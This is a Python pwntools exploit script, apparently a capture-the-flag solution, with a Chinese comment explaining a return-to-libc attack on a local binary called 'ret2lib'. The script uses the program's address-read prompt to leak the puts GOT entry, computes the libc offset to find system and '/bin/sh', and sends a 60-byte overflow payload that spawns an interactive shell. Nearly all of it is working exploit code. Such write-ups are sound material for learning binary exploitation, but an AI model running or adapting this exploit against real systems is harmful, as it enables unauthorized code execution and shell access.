#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
一套看下来，就会发现，是一道简单的return to libc ，
需要注意的地方是，第一个输入，是输入一个10进制的地址，
然后返回这个地址的内容给你
由此就产生了思路：
利用这个功能去把puts函数的真实地址打印出来，
也就是，去把got表中的内容搞出来，有了puts函数的真实地址，
然后在把libc中各个函数的地址搞出来，算一下偏移量，
就很容易得到system函数的真实地址，
然后再用find命令或者用pwntools的函数，
去找出“/bin/sh”的地址，这样我们就可以拿到shell了

'''
from pwn import *

elf = ELF('./ret2lib')
p=process('./ret2lib')
libc=ELF('/lib32/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

system_libc = libc.symbols["system"]

puts_got = elf.got["puts"] # 0x0804A01C
print "puts_got : " + hex(puts_got)

puts_plt = elf.plt['puts'] # 0x80483f0
print "puts_plt : " + hex(puts_plt)

puts_libc = libc.symbols['puts'] # 0x5fca0
print "puts_libc : " + hex(puts_libc)

binsh_libc = libc.search("/bin/sh").next() # 0x15ba0b
print "binsh_libc : " + hex(binsh_libc)

main = 0x0804857d

p.recvuntil('Give me an address (in dec) :')
log.success("ssssssssssssssssssssss:"+str(puts_got))
p.sendline(str(puts_got)) # 134520860

puts_addr=int(p.recvuntil("\n")[-11:], 16)
log.success("tttttttttttttttttttttt:" + hex(puts_addr))
print "puts_addr : " + hex(puts_addr)

offset = puts_addr - puts_libc
system_addr = system_libc + offset 
binsh = binsh_libc + offset 

payload = 'A'*60
payload += p32(system_addr) + p32(main) + p32(binsh)

p.recvuntil('Leave some message for me :')
p.sendline(payload)

# shellcode = asm(shellcraft.sh())
# flag = io.recv(...)
# log.success(flag)

p.interactive()

